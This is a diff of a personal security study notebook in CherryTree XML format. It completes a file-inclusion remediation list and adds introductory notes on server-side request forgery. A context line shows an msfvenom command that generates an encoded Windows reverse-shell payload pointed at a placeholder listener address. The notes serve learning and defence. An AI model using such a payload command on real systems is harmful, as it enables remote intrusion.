@@ -7790,7 +7790,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shik
 </rich_text>
       </node>
     </node>
-    <node name="Web Fundamentals" unique_id="251" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="1708057899" ts_lastsave="1709224420">
+    <node name="Web Fundamentals" unique_id="251" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="1708057899" ts_lastsave="1710128877">
       <node name="Walking an application" unique_id="252" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="152" is_bold="0" foreground="" ts_creation="1708057929" ts_lastsave="1708309278">
         <rich_text>Introduction
 - manually review a web app for security issues
@@ -7980,7 +7980,7 @@ Where are IDORs located
 - it could be content in AJAX request or some file of JS
 - some values is in parameters</rich_text>
       </node>
-      <node name="File Inclusion" unique_id="259" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="154" is_bold="0" foreground="" ts_creation="1709224420" ts_lastsave="1709955940">
+      <node name="File Inclusion" unique_id="259" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="154" is_bold="0" foreground="" ts_creation="1709224420" ts_lastsave="1710038865">
         <rich_text>Introduction
 - exploit of inclusion vulnerabilities
 - local file inclusion (LFI), remote File Inclusion (RFI) and directory traversal
@@ -8023,7 +8023,22 @@ Remedetion
 - use of WAF
 - disable php features that cause file inclusion 
 - analyze the web application and allow only protocol and PHP wrappers
-- Never tru</rich_text>
+- Never trust user input
+- implement whitelisting for file names and locations
+
+is possible change the method with burpsuite
+</rich_text>
+      </node>
+      <node name="Intro to SSRF" unique_id="260" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1710128877" ts_lastsave="1710129216">
+        <rich_text>what is
+- is server-side request forgery
+- allows a molicious user to cause webserver to make an additional or edited http request
+- exists two types, , first is regular, where data is returned to the attacker, the second is a blind vulnerability where occurs, but no information is returned to the attacker
+- impact:
+   → access to unauthorised areas
+   → access to customer/organisational data
+   → ability to scale to internal networks
+   → reveral authentication tokens/credentials</rich_text>
       </node>
     </node>
     <node name="Pyramid of pain" unique_id="150" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939081" ts_lastsave="1685940575">
